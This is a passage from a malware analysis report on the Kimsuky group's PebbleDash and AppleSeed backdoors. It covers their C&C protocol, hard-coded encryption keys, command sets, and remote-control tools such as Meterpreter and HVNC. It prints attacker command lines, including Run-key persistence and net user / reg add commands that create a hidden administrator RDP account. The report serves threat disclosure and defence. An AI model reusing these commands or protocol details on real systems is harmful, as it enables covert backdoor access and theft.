Hello**\n\nBesides the default items, the rest is configured dynamically for each item. For instance, items, such as\n\"type\" and \"TLS version,” are the same, but values, such as server_name and Cipher Suites that are sets\nof encryption algorithm, randomly choose one hard-coded value in the binary as shown in Figure 50.\n\n46\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 50. Randomly selected data**\n\nFor URL (server_name), one normal URL is also randomly selected among the following list.\n\n**Figure 51. Randomly selected dummy URL**\n\n\n47\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nwww.wordpress.com\nwww.wikipedia.org\nwww.yahoo.com\nwww.uc.com\nwww.paypal.com\nwww.linkedin.com\nwww.microsoft.com\nwww.avira.com\nwww.dell.com\nwww.bing.com\nwww.apple.com\nwww.avast.com\nwww.amazon.com\nwww.baidu.com\n\nThe following table provides details on the packet mentioned above that is sent to the C&C server.\n\n**Offset** **Size** **Description** **Data** **Hex**\n\n+0x00 0x01 Content Type Handshake (22) [ 16 ]\n\n+0x01 0x02 Version TLS 1.0 [ 03 01 ]\n\n+0x03 0x02 Length 106 [ 00 6A ]\n\n+0x05 0x02 Handshake Type Client Hello (1) [ 01 00 ]\n\n+0x07 0x02 Length 102 [ 00 66 ]\n\n+0x09 0x02 Version TLS 1.0 [ 03 01 ]\n\n+0x0B 0x20 [61 93 0B 3D 05 22 45 DB C9 DF\n\n2B 14 9E 1E 76 57 AB B4 BC B1\n\nRandom Random data\n\n5A B7 C4 9E C3 2B 99 CE 68 DE\n\nDD 28 ]\n\n+0x2B 0x01 Session ID Length 0 [ 00 ]\n\n+0x2C 0x01 Cipher Suites\n\n24 [ 00 18 ]\nLength\n\n+0x2E 0x18 [00 2F 00 35 00 05 00 0A C0 13\n\nCipher Suites 12 suites C0 14 C0 09 C0 0A 00 32 00 38\n\n00 13 00 04 ]\n\n+0x46 0x01 Compression\n1 [ 01 ]\nMethods Length\n\n+0x47 0x01 Compression\n\nNULL [00]\nMethods\n\n+0x48 0x02 Extensions Length 37 [ 00 25 ]\n\n+0x4A 0x13 [ 00 00 00 0F 00 0D 00 00 0A 77\nExtension server_name\n\n77 77 2E 75 63 2E 63 6F 6D ]\n\n+0x5D 0x0C [00 0A 00 08 00 06 00 17 00 18 00\nExtension elliptic_curves\n\n19 ]\n\n+0x69 0x06 Extension ec_point_formats [ 00 0B 00 02 01 00 ]\n**Table 19. Packet example**\n\n|Offset|Size|Description|Data|Hex|\n|---|---|---|---|---|\n|+0x00|0x01|Content Type|Handshake (22)|[ 16 ]|\n|+0x01|0x02|Version|TLS 1.0|[ 03 01 ]|\n|+0x03|0x02|Length|106|[ 00 6A ]|\n|+0x05|0x02|Handshake Type|Client Hello (1)|[ 01 00 ]|\n|+0x07|0x02|Length|102|[ 00 66 ]|\n|+0x09|0x02|Version|TLS 1.0|[ 03 01 ]|\n|+0x0B|0x20|Random|Random data|[61 93 0B 3D 05 22 45 DB C9 DF 2B 14 9E 1E 76 57 AB B4 BC B1 5A B7 C4 9E C3 2B 99 CE 68 DE DD 28 ]|\n|+0x2B|0x01|Session ID Length|0|[ 00 ]|\n|+0x2C|0x01|Cipher Suites Length|24|[ 00 18 ]|\n|+0x2E|0x18|Cipher Suites|12 suites|[00 2F 00 35 00 05 00 0A C0 13 C0 14 C0 09 C0 0A 00 32 00 38 00 13 00 04 ]|\n|+0x46|0x01|Compression Methods Length|1|[ 01 ]|\n|+0x47|0x01|Compression Methods|NULL|[00]|\n|+0x48|0x02|Extensions Length|37|[ 00 25 ]|\n|+0x4A|0x13|Extension|server_name|[ 00 00 00 0F 00 0D 00 00 0A 77 77 77 2E 75 63 2E 63 6F 6D ]|\n|+0x5D|0x0C|Extension|elliptic_curves|[00 0A 00 08 00 06 00 17 00 18 00 19 ]|\n|+0x69|0x06|Extension|ec_point_formats|[ 00 0B 00 02 01 00 ]|\n\n\n48\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nWhen PebbleDash sends data to the stolen C&C server, it encrypts the data using the RC4 algorithm.\nThe process will be discussed in the Performing Commands part. The case is the same when the malware\nreceives commands from the C&C server, for which the identical key is used.\n\n\n\n**- RC4 Key: 79 E1 0A 5D 87 7D 9F F7 5D 12 2E 11 65 AC E3 25**\n\n\n**Figure 52. Hard-coded RC4 key**\n\n4.1.4. Performing Commands\n\nThe commands sent from the C&C server can largely be divided into 2 stages. The first stage performs\ndefault commands as shown below. Additional commands are sent only when the command is 0x04.\n\n**Command** **Feature**\n\n0x03 Sleep (60 seconds)\n\n0x04 Additional command\n\n0x15 Setting Sleep count\n\n0x19 Restoring default Sleep\n\ncount\n\n0x26 Auto-delete\n**Table 20. Command Type 1**\n\nThe 5 commands are all simple, but as mentioned earlier, the auto-delete routine has one noticeable\ncharacteristic. To perform auto-delete, a batch file needs to be created. In this case, the name of the batch\nfile created in the %TEMP% path is \"qsm.bat\".\n\n49\n\n|Command|Feature|\n|---|---|\n|0x03|Sleep (60 seconds)|\n|0x04|Additional command|\n|0x15|Setting Sleep count|\n|0x19|Restoring default Sleep count|\n|0x26|Auto-delete|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 53. qsm.bat file used for auto-delete**\n\nIf the first Type 1 command is 0x04, the malware can download Type 2, the actual commands. The\ndownloaded commands are also encoded with RC4, and the first decoded byte is the command byte for\nthe table shown below.\n\n**Command** **Feature**\n\n0x09 Stealing drive information\n\n0x0A Terminating process\n\n0x0B Downloading files\n\n0x0C Deleting files\n\n0x0D Deleting files #2\n\n0x0E Stealing system info (Windows version,\n\nadapter, status data, etc.)\n\n0x0F Stealing information of currently\n\nrunning processes\n\n0x10 Performing command line commands\n\nand stealing results\n\n0x11 Performing command line commands\n\nand stealing results (Hidden)\n\n0x12 Changing MAC time\n\n0x13 Uploading files\n\n0x14 Setting the next C&C communications\n\ntime\n\n0x15 Setting Sleep count\n\n0x16 Setting current task directory\n\n0x18 Stealing file information\n\n0x19 Maintaining connection\n\n0x1A Stealing file and directory information\n\n0x1D Manipulating files\n\n0x1E Changing file property\n\n0x1F Running processes\n\n0x23 Changing settings data\n\n0x24 Sending settings data\n\n0x25 Scanning certain IP\n\n50\n\n|Command|Feature|\n|---|---|\n|0x09|Stealing drive information|\n|0x0A|Terminating process|\n|0x0B|Downloading files|\n|0x0C|Deleting files|\n|0x0D|Deleting files #2|\n|0x0E|Stealing system info (Windows version, adapter, status data, etc.)|\n|0x0F|Stealing information of currently running processes|\n|0x10|Performing command line commands and stealing results|\n|0x11|Performing command line commands and stealing results (Hidden)|\n|0x12|Changing MAC time|\n|0x13|Uploading files|\n|0x14|Setting the next C&C communications time|\n|0x15|Setting Sleep count|\n|0x16|Setting current task directory|\n|0x18|Stealing file information|\n|0x19|Maintaining connection|\n|0x1A|Stealing file and directory information|\n|0x1D|Manipulating files|\n|0x1E|Changing file property|\n|0x1F|Running processes|\n|0x23|Changing settings data|\n|0x24|Sending settings data|\n|0x25|Scanning certain IP|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n0x26 Auto-delete\n\n0x27 Uploading and deleting files\n**Table 21. Command Type 2**\n\nAs most of the commands the malware support are also normally supported by other backdoors, this\nreport will only focus on those with noticeable traits. The commands 0x0C and 0x0D both delete files in\nthe path that they receive. Yet, whereas 0x0C simply deletes files using the DeleteFileW() API, the 0x0D\ncommand deletes files after overwriting them with dummy data. It appears that the latter is to obstruct file\nrecovery in the future.\n\n0x10 and 0x11 perform command line commands and send the result to the C&C server. The only\ndifference between the two is whether the CREATE_NO_WINDOW flag is used or not (status for\noutputting the console window). Each command uses the following command lines to output the result in\nthe %TEMP% path and sends it to the C&C server.\n\n - cmd.exe /c [Command] >[Temp file] 2>&1\n\n - cmd.exe /c [Command] 2>[Temp file]\n\nThe 0x12 command changes the MAC (Modified Time, Accessed Time, and Created Time) time of the\nfile. It finds the MAC time of the file in the path that it received as the first argument and changes it to the\nMAC time of the file that it received as the second argument. The 0x1E command can change file\nproperties, and the 0x1D command can also change the header TimeStamp besides file properties if the\ntarget file is PE.\n\n4.2. Analysis of Latest PebbleDash\n\n4.2.1. Initial Routine\n\nEncoded inside the recent PebbleDash samples are strings and a list of API functions that will be used,\nbut their algorithms are different from the ones used in the past. The current analysis target sample has\nthe following string consisting of numbers and alphabetical characters in random order.\n\n**- Data String (DataStr):**\nzcgXlSWkj314CwaYLvyh0U_odZH8OReKiNIr-JM2G7QAxpnmEVbqP5TuB9Ds6fFt\n\nThe following table shows the offset for each uppercase and lowercase alphabets, number, and special\ncharacters \"-\" and \"_\".\n\n**Character** **Offset** **Character** **Offset** **Character** **Offset** **Character** **Offset**\n\n0 0x14 G 0x28 W 0x06 m 0x2F\n\n1 0x0A H 0x1A X 0x03 n 0x2e\n\n2 0x27 I 0x22 Y 0x0F o 0x17\n\n3 0x09 J 0x25 Z 0x19 p 0x2D\n\n4 0x0B K 0x1F a 0x0E q 0x33\n\n5 0x35 L 0x10 b 0x32 r 0x23\n\n6 0x3C M 0x26 c 0x01 s 0x3B\n\n51\n\n|0x26|Auto-delete|\n|---|---|\n|0x27|Uploading and deleting files|\n\n|Character|Offset|Character|Offset|Character|Offset|Character|Offset|\n|---|---|---|---|---|---|---|---|\n|0|0x14|G|0x28|W|0x06|m|0x2F|\n|1|0x0A|H|0x1A|X|0x03|n|0x2e|\n|2|0x27|I|0x22|Y|0x0F|o|0x17|\n|3|0x09|J|0x25|Z|0x19|p|0x2D|\n|4|0x0B|K|0x1F|a|0x0E|q|0x33|\n|5|0x35|L|0x10|b|0x32|r|0x23|\n|6|0x3C|M|0x26|c|0x01|s|0x3B|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n7 0x29 N 0x21 d 0x18 t 0x3F\n\n8 0x1B O 0x1C e 0x1E u 0x37\n\n9 0x39 P 0x34 f 0x3D v 0x11\n\nA 0x2B Q 0x2A g 0x02 w 0x0D\n\nB 0x38 R 0x1D h 0x13 x 0x2C\n\nC 0x0C S 0x05 i 0x20 y 0x12\n\nD 0x3A T 0x36 j 0x08 z 0x00\n\nE 0x30 U 0x15 k 0x07    - 0x24\n\nF 0x3E V 0x31 l 0x04 _ 0x16\n**Table 22. Offset of each character**\n\nThe following example shows how the argument string needed for execution (MskulCxGMCgpGdM) is\ndecrypted. The string is 15 characters, but the encrypted string is 19 characters.\n\n**- Encrypted String (EncStr): P9HpHPN-BSWUHSOHOvz**\n\n**- Decrypted String: MskulCxGMCgpGdM**\n\nThe offsets for the first 4 characters of the 19-character string (P9Hp) is shown below. Each 0x4 byte\nbelow is circulated in order and used as a key.\n\n**- Offsets for First 4 Strings (EncKey): 0x34, 0x39, 0x1A, 0x2D**\n\nThe malware starts operation for the rest of the characters (HPN-BSWUHSOHOvz). You can see that the\nfirst character is H and the offset 0x1A. As for 0x1A, subtracting the first key 0x34 and performing the 'and'\noperation with 0x3F results in 0x26. Finding the 0x26 offset string from the string\n(zcgXlSWkj314CwaYLvyh0U_odZH8OReKiNIr-JM2G7QAxpnmEVbqP5TuB9Ds6fFt) yields \"M\".\n\n**- Decryption Algorithm: offet( DataStr, ( offet( EncStr, n ) - offset( EncKey, n%3 ) ) and 0x3F )**\n\nAs the operation only processes characters included in the string, those such as \".\" are not encrypted.\nThe following example shows that the string \"/\" was not encrypted because it was not included in the string.\n\n**- Encrypted String: rQvVWjh Vg7 TVyG\\JGnIuK0c\\zv-wGxD2L\\E1t3DuC\\-NP0cdLgcwCvDd\\0Hd /s**\n\"\\\"%C\\\" %x\" /E kcZ9mQ /s \"%J\" /2\n\n**- Decrypted String: reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /d \"\\\"%s\\\" %s\" /t**\nREG_SZ /v \"%s\" /f\n\nLike the initial version, the latest PebbleDash sample compares the string \"MskulCxGMCgpGdM\" to the\nargument string that it received upon execution. When the strings do not match, it terminates itself.\nWhen the malware is executed by receiving the argument in the actual environment, it first creates the\n\\system32\\ folder in the same directory and copies itself with the name smss.exe. Note that recently\nconfirmed PebbleDash strains all copies themselves in that directory. Unlike the initial samples that did\nnothing for their sustenance, the new samples register a string such as the encrypted string shown\nabove to the Run key using the reg command.\n\nThey then run recursion by sending the argument \"YRfDFtxLjoBuYXA\" along with the path of the previous\nfile as shown below. When PebbleDash samples receive the argument and the third argument, they delete\nfiles in the path received through the third argument. The files are not directly deleted but overwritten with\n\n52\n\n|7|0x29|N|0x21|d|0x18|t|0x3F|\n|---|---|---|---|---|---|---|---|\n|8|0x1B|O|0x1C|e|0x1E|u|0x37|\n|9|0x39|P|0x34|f|0x3D|v|0x11|\n|A|0x2B|Q|0x2A|g|0x02|w|0x0D|\n|B|0x38|R|0x1D|h|0x13|x|0x2C|\n|C|0x0C|S|0x05|i|0x20|y|0x12|\n|D|0x3A|T|0x36|j|0x08|z|0x00|\n|E|0x30|U|0x15|k|0x07|-|0x24|\n|F|0x3E|V|0x31|l|0x04|_|0x16|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nNULL data like the command in the initial PebbleDash version.\n\n\nC:\\ProgramData\\system32\\smss.exe YRfDFtxLjoBuYXA \"C:\\ProgramData\\PebbleDash.exe\"\n\n\n4.2.2. Recovering Settings Data\n\nRecently confirmed PebbleDash samples encrypt settings data like previous versions. For the latest form,\nthe simple 0x10 byte Xor method is used. While it is 0x10 byte, the key value is still 0x9F.\n\n\n\n**- Xor Key: 9F 9F 9F 9F 9F 9F 9F 9F 9F 9F 9F 9F 9F 9F 9F 9F**\n\n\n**Figure 54. Xor decryption routine**\n\n**Figure 55. Settings data being decrypted**\n\n\n53\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe following table shows the settings data used in the latest PebbleDash sample. They are mostly similar\nto the samples discussed earlier in this report. There are some differences; the volume serial number is\nused along with random data when the sample communicates with the C&C server, and unlike the initial\nversion, which used Raw Socket to communicate with the C&C server, the latest version uses the HTTP\nprotocol.\n\n**Offset** **Size** **Meaning**\n\n+0x0000 0x0008 Next C&C communications time\n\n+0x0008 0x0004 Default Sleep time (in minutes)\n\n+0x000C 0x0004 Volume serial number\n\n+0x0010 0x0004 Drive notification flag\n\n+0x0014 0x0004 Session notification flag\n\n+0x0018 0x0208 C&C Server URL #1\n\n+0x0220 0x0208 C&C Server URL #2\n\n+0x0428 0x0208 C&C Server URL #3\n\n+0x0630 0x0208 C&C Server URL #4\n\n+0x0838 0x0208 C&C Server URL #5\n\n+0x0A40 0x0800 Shell (cmd.exe)\n\n+0x1240 0x0800 Temp Directory\n**Table 23. Settings data**\n\nThe part that sets the next C&C communications time, default Sleep count, and notification flags for drives\nand sessions are mostly the same. The status data also have identical values.\n\n**Status Data** **Meaning**\n\n0x00 Initial Value\n\n0x01 Performing waiting routine\n\n0x02 Performing command routine\n\n(in units of 5)\n\n0x03 When a drive is added (usually\n\nwhen USB is inserted)\n\n0x04 When a session is added\n(usually logging in through local\n\nor RDP)\n**Table 24. Types of status data**\n\n4.2.3. C&C Communications\n\nThe latest version of PebbleDash uses the HTTP protocol to communicate with the C&C server and as\nsuch, uses queries to send and receive data. The following table shows the queries used to communicate\nwith the C&C server.\n\n54\n\n|Offset|Size|Meaning|\n|---|---|---|\n|+0x0000|0x0008|Next C&C communications time|\n|+0x0008|0x0004|Default Sleep time (in minutes)|\n|+0x000C|0x0004|Volume serial number|\n|+0x0010|0x0004|Drive notification flag|\n|+0x0014|0x0004|Session notification flag|\n|+0x0018|0x0208|C&C Server URL #1|\n|+0x0220|0x0208|C&C Server URL #2|\n|+0x0428|0x0208|C&C Server URL #3|\n|+0x0630|0x0208|C&C Server URL #4|\n|+0x0838|0x0208|C&C Server URL #5|\n|+0x0A40|0x0800|Shell (cmd.exe)|\n|+0x1240|0x0800|Temp Directory|\n\n|Status Data|Meaning|\n|---|---|\n|0x00|Initial Value|\n|0x01|Performing waiting routine|\n|0x02|Performing command routine (in units of 5)|\n|0x03|When a drive is added (usually when USB is inserted)|\n|0x04|When a session is added (usually logging in through local or RDP)|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Query**\n\n**Meaning**\n**Type**\n\nsep Types of data that is sent\n\nuid Volume serial number\n\nsid Random data\n\ndata Data to be sent\n**Table 25. Queries used for C&C communication**\n\nFor instance, when the malware tries to secure the initial connection, it makes a POST request with the\nfollowing query:\n\n[C&C URL]?sep=zDyTRPortBIUyue&uid=7057e9dc&sid=01d1f346\n\n\"sep\" refers to the type of data that will be sent. The current analysis target sample has 6 queries defined\nbut practically, 3 are used.\n\n**Figure 56. Defined Types**\n\n**Query**\n**Query String** **Use**\n**Number**\n\n1 zDyTRPortBIUyue Securing connection with\n\nthe C&C server\n\n2 QFbgweAUBDjojNR Sending command\n\nperform results\n\n3 BJIcQHTzhmuafuL Downloading commands\n\n4 trceNSkCJRwZQQL Not used\n\n5 qWTZUgfjdigTpUW Not used\n\n6 lZpReYjnpgYClLi Not used\n**Table 26. Types of data sent**\n\n55\n\n|Query Type|Meaning|\n|---|---|\n|sep|Types of data that is sent|\n|uid|Volume serial number|\n|sid|Random data|\n|data|Data to be sent|\n\n|Query Number|Query String|Use|\n|---|---|---|\n|1|zDyTRPortBIUyue|Securing connection with the C&C server|\n|2|QFbgweAUBDjojNR|Sending command perform results|\n|3|BJIcQHTzhmuafuL|Downloading commands|\n|4|trceNSkCJRwZQQL|Not used|\n|5|qWTZUgfjdigTpUW|Not used|\n|6|lZpReYjnpgYClLi|Not used|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nWhen the malware successfully connects to the C&C server, it downloads commands using the following\nquery. \"uid\" is not included as it is only used to establish the initial connection, and the 3rd query and \"sid\"\nare used instead.\n\n[C&C URL]?sep=BJIcQHTzhmuafuL&sid=01d1f346\n\nThe downloaded data is likely a string encoded with Base64. The data received goes through the Base64\ndecoding process. You can check the actual commands if you decrypt the data using the AES128\nalgorithm.\n\n\n\n**- AES128 Key: erNpiMneSIYnRKoE**\n\n\n**Figure 57. Base64 Decoding and AES128 Decryption Routine**\n\nWhen receiving commands as well as sending results PebbleDash goes through the AES128 encryption\nand Base64 encoding process. The AES128 key is the same for both cases. It sends a routine that sends\nthe success and failure status, and the one that sends the result for performing commands. They are all\nsent as the \"data\" item shown below.\n\n[C&C URL]?sep=QFbgweAUBDjojNR&sid=01d1f346&data=LainSGh6TfPX9wC8LkBHKw==\n\nThe success and failure status are 0x02 and 0x01 respectively. Upon success, the data is created by\ngoing via the following process.\n\n\n\n**- Original Data: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00**\n\n**- AES128 Encryption: 2D A8 A7 48 68 7A 4D F3 D7 F7 00 BC 2E 40 47 2B**\n\n**- Base64 Encryption: LainSGh6TfPX9wC8LkBHKw==**\n\n\n56\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n4.2.4. Performing Commands\n\nMost of the commands supported by the latest version of PebbleDash are not much different from the\nprevious samples. Their features are similar as well. For instance, upon self-deletion, it creates the\n\"qsm.bat\" batch file and executes it to carry out the process. Furthermore, the command lines used to\nsend results after performing commands are almost the same.\n\n**Command** **Feature**\n\n0x03 Setting current task directory\n\n0x04 Changing MAC time\n\n0x05 Terminating process\n\n0x06 Stealing information of currently running\n\nprocesses\n\n0x07 Deleting files\n\n0x08 Deleting files #2\n\n0x09 Running processes\n\n0x0A Execution using file download and RegSvr32\n\n0x0B Execution in file download and memory\n\n0x0C Uploading files\n\n0x0D Downloading files\n\n0x0E Setting the next C&C communications time (in\n\nminutes)\n\n0x0F Setting the next C&C communications time (in\n\nHex)\n\n0x10 Auto-delete\n\n0x11 Stealing system info (Windows version,\n\nadapter, status data, etc.)\n\n0x12 Changing settings data\n\n0x13 Sending settings data\n\n0x14 Performing command line commands and\n\nstealing results (Hidden)\n\n0x15 Performing command line commands and\n\nstealing results\n\n0x16 Maintaining connection\n**Table 27. Command list**\n\nSome of the commands in the list above deserve a special discussion. First of all, it should be noted that\nmost types of malware recently created by Kimsuky group are in DLL forms executed through\nregsvr32.exe. The purpose of the 0x0A command is to support such malware strains, having an additional\ncommand to execute the malware with \"regsvr32.exe /s\" after downloading payloads. In the case of the\n0x0B command, it supports a command that can execute the malware in memory instead of downloading\nin file forms. This type of payload supports DLL as well as an EXE form PE.\n\n57\n\n|Command|Feature|\n|---|---|\n|0x03|Setting current task directory|\n|0x04|Changing MAC time|\n|0x05|Terminating process|\n|0x06|Stealing information of currently running processes|\n|0x07|Deleting files|\n|0x08|Deleting files #2|\n|0x09|Running processes|\n|0x0A|Execution using file download and RegSvr32|\n|0x0B|Execution in file download and memory|\n|0x0C|Uploading files|\n|0x0D|Downloading files|\n|0x0E|Setting the next C&C communications time (in minutes)|\n|0x0F|Setting the next C&C communications time (in Hex)|\n|0x10|Auto-delete|\n|0x11|Stealing system info (Windows version, adapter, status data, etc.)|\n|0x12|Changing settings data|\n|0x13|Sending settings data|\n|0x14|Performing command line commands and stealing results (Hidden)|\n|0x15|Performing command line commands and stealing results|\n|0x16|Maintaining connection|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n5. Post Infection\n\nAfter the initial compromise, the Kimsuky group installs a backdoor such as AppleSeed or PebbleDash on\nthe target system. In most cases, they continue to install additional malware strains. While these malware\nstrains can install additional files, steal information, and perform command line commands sent from the\nattacker, they lack features to remotely control the infected system like other backdoor and RAT malware.\nThis is why the attackers install Meterpreter backdoor of Metasploit or VNC malware to remotely control\nthe system through additional payloads.\n\nVNC, also known as Virtual Network Computing, is a screen sharing system that remotely controls other\ncomputers. Similar to the commonly-used RDP, it is used to remotely access and control other systems.\nThe technology allows attackers to control the targeted system in a graphic environment.\n\nThis part will discuss malware strains that are additionally installed by the Kimsuky group after the system\nis infected with AppleSeed or PebbleDash.\n\n5.1. Remote Control\n\n5.1.1. Meterpreter\n\nMetasploit is a penetration testing framework. It is a tool that can be used to inspect security vulnerabilities\nfor networks and systems of companies and organizations, providing various features for each penetration\ntest stage. Like Cobalt Strike, it provides features necessary for each stage, from creating various types\nof payloads for the initial infection and stealing account credentials to dominating the system via lateral\nmovement.\n\n**Figure 58. Metasploit GitHub**\n\nCobalt Strike provides Beacon which is the actual malware that operates as a backdoor in the infected\nPC. Depending on the method of installing a Beacon, it can be classified as Staged or Stageless. When\nCobalt Strike is built with the Staged method, a powershell or small shellcode that has a downloader\nfeature is created. The attacker can distribute such small-sized stager through various means. When the\nstager is executed in the infected PC, it downloads Beacon that is the main malware from the C&C server\non the memory and executes it. The Stageless method creates a binary included with Beacon instead. As\nsuch, the binary can directly communicate with the C&C server without having to download Beacon.\n\n58\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nMetasploit also provides a backdoor that performs actual malicious behaviors like Beacon from Cobalt\nStrike, called Meterpreter. Like Beacon, it can be created in both Staged and Stageless methods. This\nmeans that both Cobalt Strike and Metasploit can be used as penetration test tools to control the infected\nPC and steal information.\n\nThe Kimsuky group mainly uses the stager method. Instead of including Meterpreter in the distributed file,\na shellcode is included to download a backdoor containing Meterpreter. To be more precise, the\ndownloaded file is metsrv.dll, the basic backdoor of Meterpreter. The file is created to be executed with\nthe Reflective DLL injection method as shown below. One characteristic of the method is that the start\naddress (the part starting with MZ) can operate as a code. The code that newly loads the DLL file itself\ninto the memory through MZ is executed. When the loading is complete (in other words, when the\nReflective DLL injection method is finished), the file hands over the control to run the actual code of\nmetsrv.dll. Note that Meterpreter is modularized depending on its features. Besides the default metsrv.dll,\nit supports various extension DLLs for privilege escalation or additional tasks.\n\nMost of the samples collected are x64 DLL, executed by being loaded through the regsvr32.exe process.\nA glance at the file shows that the strings are obfuscated like other malware of the Kimsuky group. The\nfollowing shows a routine that injects the stager shellcode to rundll32.exe.\n\n**Figure 59. Decoding routine similar to AppleSeed, Kimsuky group's another backdoor**\n\nThe injected shellcode downloads Meterpreter on the memory from the 79.133.41[.]237:4001 URL and\nexecutes it. The following is the Meterpreter DLL downloaded from the Metasploit C&C server, which is\nsimilar to the binary found in the memory area mentioned above.\n\n59\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 60. Meterpreter DLL being downloaded**\n\nThe downloaded binary is the same as the source code of the open source Meterpreter.\n\n**Figure 61. server_setup() function that is initial routine of downloaded metsrv.dll**\n\n5.1.2. HVNC (TinyNuke)\n\nTinyNuke, also known as Nuclear Bot, is a banking malware discovered in 2016. It includes features such\nas HVNC (HiddenDesktop/VNC), reverse SOCKS4 proxy, and form grabbing. As its source code was\nrevealed in 2017, TinyNuke is used by various attackers, and the HVNC feature is partially borrowed by\nother malware such as AveMaria and BitRAT.\n\nAmong the various features of TinyNuke that is being distributed, only the HVNC feature is enabled. A\ndifference between normal VNC and HVNC used by TinyNuke is that the user does not realize that the\n\n60\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nPC is infected and its screen is being controlled. The following shows the process tree when HVNC is\nenabled.\n\n**Figure 62. Process tree upon using HVNC**\n\nIn the process tree is explorer.exe (PID: 3140), which is the child process of explorer.exe (PID: 2216). The\nattacker is able to control the screen via the new explorer.exe (PID: 3140), and the GUI (Graphical user\ninterface) of the process created while the attacker is controlling the target PC is not visible on the target\nPC screen. This type of VNC remote access is called HVNC (Hidden Virtual Network Computing).\n\nAnother characteristic of the malware is that it uses the reverse VNC method. VNC consists of a server\nand a client. It installs the VNC server on the control target system, and the user who wishes to control\nthe system remotely uses the VNC client. It gains control of the VNC client by going through the VNC\nserver installed on the remote control target system.\n\nIn a normal VNC environment, it attempts to access the remote control target (VNC server) via the VNC\nclient. However, HVNC of TinyNuke attempts to access the client from the server with the Reverse VNC\nfeature. This means that when HVNC of the infected system is run, the awaiting attacker accesses the\ndesignated C&C server and uses the VNC client (server for HVNC) on the C&C server to gain remote\ncontrol. It is assumed that this is to bypass firewalls such as Reverse Shell that blocks internal access\nfrom the outside and to support communication in a private IP environment.\n\n61\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 63. Attacker's HVNC screen**\n\nNote that TinyNuke uses \"AVE_MARIA\" string for verification when establishing the HVNC communication\nbetween the server and the client. This means that when \"AVE_MARIA\" string is sent from the HVNC\nclient to the server, the server verifies the name, and the HVNC communication can be enabled if\n\"AVE_MARIA\" is correct.\n\n**Figure 64. AVE_MARIA string used in HVNC**\n\nThis is identical to that of HVNC used by Kimsuky group. However, recently there have been HVNCs\nusing the \"LIGHT's BOMB\" string.\n\n62\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 65. \"LIGHT'S BOMB\" string used in place of AVE_MARIA**\n\n5.1.3. TightVNC\n\nAnother VNC malware distributed via AppleSeed backdoor is TightVNC. TightVNC is an open-source\nVNC utility, and the attacker customizes it to use it. TightVNC can be regarded as a normal VNC utility,\nbut it is different in that it supports the reverse VNC feature discussed earlier.\n\nTightVNC consists of tvnserver.exe, the server module, and tvnviewer.exe, the client module. In a normal\nenvironment, it installs tvnserver on the remote control target and accesses the target using tvnviewer in\nthe user environment. In order to use the Reverse VNC feature, it executes tvnviewer as a listening mode\non the client, then uses tvnserver that is installed as a service on the access target system to set the client\naddress using controlservice and connect commands for access gain.\n\nThe Kimsuky group distributes tvnserver, and it is customized so that the Reverse VNC feature can be\nused in the infected environment without installing a service. As such, simply running tvnserver will allow\nthe attacker to access tvnviewer that operates on the C&C server and gain control of the screen of the\ninfected system.\n\n**Figure 66. Reverse VNC communications using tvnviewer**\n\n63\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n5.1.4. RDP Wrapper\n\nMeterpreter and VNC malware types were mainly discussed in earlier parts, yet the attacker also uses\nRDP Wrapper for remote control. RDP Wrapper is an open source utility that supports the remote desktop\nfeature. Since Windows OS does not support remote desktop in all versions, RDP Wrapper needs to be\ninstalled to enable the feature. The Kimsuky group installs RDP Wrapper to multiple systems infected with\nAppleSeed.\n\n5.2. RDP Related\n\n5.2.1. Adding RDP User\n\nAmong the earlier-mentioned PIF droppers, there was the type that drop and execute malware which\nperform the role of adding RDP user. It adds an account with the following credential.\n\n**- User Account: default**\n\n**- Password: 1qaz2wsx#EDC**\n\nIt adds an account by executing simple command line commands like shown below. When the commands\nare over, that is, when the malware achieves its aim, it deletes itself using a batch file.\n\n - net user /add default 1qaz2wsx#EDC\n\n - net localgroup Administrators default /add\n\n - net localgroup \"Remote Desktop Users\" default /add\n\n - reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v default /t REG_DWORD /d 0 /f\n\n - reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t\nREG_DWORD /d 0 /f\n\nThe commands use the net command to register a user named \"default\". The user is included in the admin\ngroup as well as the RDP group, so it appears that the account will later be used to access RDP. The\nmalware then registers the added user account to the SpecialAccounts registry key so that the user cannot\nknow that an account has been added in the login screen.\n\nSeeing how the admin privilege is required by default to add a user account, the malware and the PIF\ndropper itself may have been run by other malware via 'run as administrator' after going through the\nprivilege escalation process instead of the user clicking it. As one needs admin privilege to add user\nprivilege, there have been cases where the malware 